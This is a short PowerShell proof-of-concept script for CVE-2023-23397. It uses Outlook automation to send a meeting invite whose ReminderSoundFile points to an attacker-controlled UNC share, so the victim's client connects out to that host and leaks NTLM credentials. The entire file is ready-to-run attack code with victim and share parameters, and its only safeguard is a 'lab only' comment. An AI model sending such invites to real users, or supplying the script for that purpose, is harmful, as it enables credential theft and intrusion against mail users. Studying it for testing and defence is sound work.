<#
Title: CVE-2023-23397 PoC Sender
Use ONLY in an isolated lab.
#>

param(
  [Parameter(Mandatory=$true)][string]$Victim,
  [Parameter(Mandatory=$true)][string]$UNC,
  [string]$Subject = "Team Sync",
  [int]$MinutesBefore = 15
)

try {
  $outlook = New-Object -ComObject Outlook.Application
  $appt = $outlook.CreateItem(1) # olAppointmentItem
  $appt.MeetingStatus = 1        # olMeeting
  $null = $appt.Recipients.Add($Victim)
  $appt.Subject = $Subject
  $appt.Start = (Get-Date).AddMinutes(30)
  $appt.Duration = 30
  $appt.ReminderSet = $true
  $appt.ReminderMinutesBeforeStart = $MinutesBefore
  $appt.ReminderPlaySound = $true
  $appt.ReminderSoundFile = $UNC  # e.g., \\192.168.56.10\share\poc.wav
  $appt.Body = "Automated lab invite."
  $appt.Send()
  Write-Host "[+] Invite sent to $Victim with ReminderSoundFile = $UNC"
} catch {
  Write-Error "Failed: $($_.Exception.Message)"
  exit 1
}
